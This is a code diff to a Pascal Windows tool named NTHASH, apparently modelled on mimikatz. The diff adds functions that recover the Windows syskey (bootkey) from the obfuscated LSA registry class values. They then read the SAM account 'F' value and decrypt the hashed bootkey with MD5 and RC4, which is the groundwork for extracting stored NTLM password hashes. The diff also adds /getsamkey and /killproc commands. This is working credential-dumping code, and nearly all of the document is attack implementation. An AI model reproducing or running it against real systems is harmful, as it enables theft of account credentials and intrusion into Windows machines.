@@ -25,6 +25,7 @@ var
   mystringsid:pchar;
   winver,osarch:string;
   sysdir:pchar;
+  syskey,samkey:tbyte16;
 
 
 
@@ -1023,84 +1024,120 @@ begin
 result:=false;
 for i:=0 to length(keys)-1 do
     begin
-    getclass (HKEY_LOCAL_MACHINE ,'SYSTEM\CurrentControlSet\Control\Lsa',keys[i],enc_bytes);
+    result:=getclass (HKEY_LOCAL_MACHINE ,'SYSTEM\CurrentControlSet\Control\Lsa',keys[i],enc_bytes);
     CopyMemory (@bytes[i*4],@enc_bytes[0],4);
     end;
-result:=true;
 end;
 
 //see kuhl_m_lsadump_getSamKey in kuhl_m_lsadump_getSamKey
-function gethashedbootkey(salt,samkey,syskey:array of byte;var bootkey:tbyte16):boolean;
+function gethashedbootkey(salt,syskey:tbyte16;samkey:array of byte;var hashed_bootkey:tbyte16):boolean;
 const
-  SAM_QWERTY:pchar='!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0';
-  SAM_NUM:pchar='0123456789012345678901234567890123456789\0';
+  SAM_QWERTY:ansistring='!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%'#0;
+  SAM_NUM:ansistring='0123456789012345678901234567890123456789'#0;
+  password:pansichar='password';
 var
   md5ctx:md5_ctx;
-  data:PCRYPTO_BUFFER; //= (SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey),
+  data:_CRYPTO_BUFFER; //= (SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey),
   key:_CRYPTO_BUFFER; // = (MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest);
   status:ntstatus;
+  buffer:array of byte;
 begin
 //based on the first byte of F
 //md5/rc4 on "old" ntlm
-MD5Init(md5ctx);
-	MD5Update(md5ctx,salt ,16); //F[0x70:0x80]=SALT
-	MD5Update(md5ctx,SAM_QWERTY,lstrlen(SAM_QWERTY)+1);
-	MD5Update(md5ctx,syskey,sizeof(syskey));
-	MD5Update(md5ctx,SAM_NUM,lstrlen(SAM_NUM)+1);
+        result:=false;
+
+        //test
+        {
+        MD5Init(md5ctx);
+        MD5Update(md5ctx ,password^,strlen(password)); //a buffer, not a pointer - password[0] would work too
+        MD5Final(md5ctx );
+        writeln('expected:5F4DCC3B5AA765D61D8327DEB882CF99');
+        writeln('result  :'+HashByteToString (md5ctx.digest ));
+        setlength(buffer,strlen(password));
+        copymemory(@buffer[0],password,strlen(password));
+        MD5Init(md5ctx);
+        MD5Update(md5ctx ,pchar(buffer)^,strlen(password)); //a buffer, not a pointer - buffer[0] would work too
+        MD5Final(md5ctx );
+        writeln('expected:5F4DCC3B5AA765D61D8327DEB882CF99');
+        writeln('result  :'+HashByteToString (md5ctx.digest ));
+        }
+        //
+        fillchar(md5ctx,sizeof(md5ctx ),0);
+        MD5Init(md5ctx);
+	MD5Update(md5ctx,salt ,SAM_KEY_DATA_SALT_LENGTH); //F[0x70:0x80]=SALT
+	MD5Update(md5ctx,pansichar(SAM_QWERTY)^,length(SAM_QWERTY)); //46
+	MD5Update(md5ctx,syskey,SYSKEY_LENGTH);  //16
+	MD5Update(md5ctx,pansichar(SAM_NUM)^,length(SAM_NUM)); //40
 	MD5Final(md5ctx); //rc4_key = MD5(F[0x70:0x80] + aqwerty + bootkey + anum)
-        data:=allocmem(sizeof(_CRYPTO_BUFFER));
+        log('RC4Key:'+HashByteToString (md5ctx.digest),0);
+        //in and out
+        fillchar(data,sizeof(data),0);
         data.Length :=SAM_KEY_DATA_KEY_LENGTH;
         data.MaximumLength :=SAM_KEY_DATA_KEY_LENGTH;
-        data.Buffer :=samkey; //F[0x80:0xA0]=SAMKEY
+        data.Buffer :=samkey; //F[0x80:0xA0]=SAMKEY encrypted
+        //in only
+        fillchar(key,sizeof(key),0);
         key.Length:=MD5_DIGEST_LENGTH;
         key.MaximumLength:=MD5_DIGEST_LENGTH;
-        key.Buffer:=md5ctx.digest ;
-        status:=RtlEncryptDecryptRC4(data,@key);
-        writeln(status);
+        key.Buffer:=md5ctx.digest ;  //rc4_key
+        status:=RtlEncryptDecryptRC4(data,key);
+        if status<>0 then log('RtlEncryptDecryptRC4 NOT OK',0) else log('RtlEncryptDecryptRC4 OK',0);
+        result:=status=0;
+        if status=0 then CopyMemory(@hashed_bootkey [0],data.Buffer ,sizeof(hashed_bootkey)) ;
+
 //we should cover AES/DES on new "ntlm"
 end;
 
-//also known as bootkey
-function getsyskey:boolean;
-const
-  syskeyPerm:array[0..15] of byte=($8,$5,$4,$2,$b,$9,$d,$3,$0,$6,$1,$c,$e,$a,$f,$7);
+//also known as hashed bootkey
+function getsamkey(syskey:tbyte16;var output:tbyte16):boolean;
 var
-  salt,bytes:array[0..15] of byte;
-  syskey:array[0..15] of byte;
-  samkey:array[0..31] of byte;
-  i:byte;
   ret:long;
   topkey:thandle;
-  dwDisposition:dword=0;
-  sam:array[0..1023] of byte;
   cbdata,lptype:dword;
-  dummy:string;
+  sam:array[0..1023] of byte;
+  salt:tbyte16;
+  encrypted_samkey:array[0..31] of byte;
+  //bytes:array[0..15] of byte;
 begin
-//get the encoded syskey
-get_encoded_syskey(bytes);
-//Get syskey raw bytes (using permutation)
-for i:=0 to sizeof(bytes)-1 do syskey[i] := bytes[syskeyPerm[i]];
-dummy:=HashByteToString (tbyte16(syskey));
-writeln(dummy);
-exit; //for now
-writeln;
 //only if run as system
-ret := RegCreateKeyEx(HKEY_LOCAL_MACHINE ,pchar('SAM\sam\Domains\account'),0,nil,REG_OPTION_NON_VOLATILE,KEY_READ,nil,topKey,@dwDisposition);
-//ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SAM\sam\Domains\account',0, KEY_READ, topkey);
+//ret := RegCreateKeyEx(HKEY_LOCAL_MACHINE ,pchar('SAM\sam\Domains\account'),0,nil,REG_OPTION_NON_VOLATILE,KEY_READ,nil,topKey,@dwDisposition);
+ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SAM\sam\Domains\account',0, KEY_READ, topkey);
 if ret=0 then
   begin
-  writeln('RegCreateKeyEx OK');
+  log('RegCreateKeyEx OK',0);
   cbdata:=sizeof(sam);
   //contains our salt and encrypted sam key
   ret := RegQueryValueex (topkey,pchar('F'),nil,@lptype,@sam[0],@cbdata);
   if ret=0 then
      begin
-     writeln('RegQueryValue OK');
-     writeln(sam[0]);
+     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
+     //writeln(sam[0]);
+     CopyMemory(@salt[0],@sam[$70],sizeof(salt)) ;
+     CopyMemory(@encrypted_samkey[0],@sam[$80],sizeof(samkey)) ;
+     //writeln('SAMKey:'+HashByteToString (samkey));
+     result:= gethashedbootkey(salt,syskey,encrypted_samkey,tbyte16(output)); //=true then writeln('SAMKey:'+HashByteToString (tbyte16(bytes)));
      end
      else writeln(ret);
   end;
 RegCloseKey(topkey);
+end;
+
+//also known as bootkey
+function getsyskey(var output:tbyte16):boolean;
+const
+  syskeyPerm:array[0..15] of byte=($8,$5,$4,$2,$b,$9,$d,$3,$0,$6,$1,$c,$e,$a,$f,$7);
+var
+  bytes:array[0..15] of byte;
+  //syskey:tbyte16;
+  i:byte;
+  //dummy:string;
+begin
+result:=false;
+//get the encoded syskey
+result:=get_encoded_syskey(bytes);
+//Get syskey raw bytes (using permutation)
+for i:=0 to sizeof(bytes)-1 do output[i] := bytes[syskeyPerm[i]];
+//if getsamkey(output,samkey)=true then writeln('SAMKey:'+HashByteToString (samkey));
 end;
 
 function createprocessaspid(ApplicationName: string;pid:string     ):boolean;
@@ -1155,6 +1192,7 @@ begin
   log('NTHASH /runaschild /pid:12345 [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /enumpriv',1);
   log('NTHASH /enumproc',1);
+  log('NTHASH /killproc /pid:12345',1);
   log('NTHASH /enummod /pid:12345',1);
   log('NTHASH /dumpprocess /pid:12345',1);
   log('NTHASH /a_command /verbose',1);
@@ -1178,7 +1216,21 @@ begin
   p:=pos('/getsyskey',cmdline);
   if p>0 then
      begin
-     getsyskey;
+     if getsyskey(syskey)
+        then log('Syskey:'+HashByteToString(syskey) ,1)
+        else log('getsyskey NOT OK' ,1);
+     exit;
+     end;
+  p:=pos('/getsamkey',cmdline);
+  if p>0 then
+     begin
+     if getsyskey(syskey) then
+        begin
+        if getsamkey(syskey,samkey)
+           then log('SAMKey:'+HashByteToString(samkey) ,1)
+           else log('getsamkey NOT OK' ,1);
+        end //if getsyskey(syskey) then
+        else log('getsyskey NOT OK' ,1);
      exit;
      end;
   p:=pos('/pid:',cmdline);
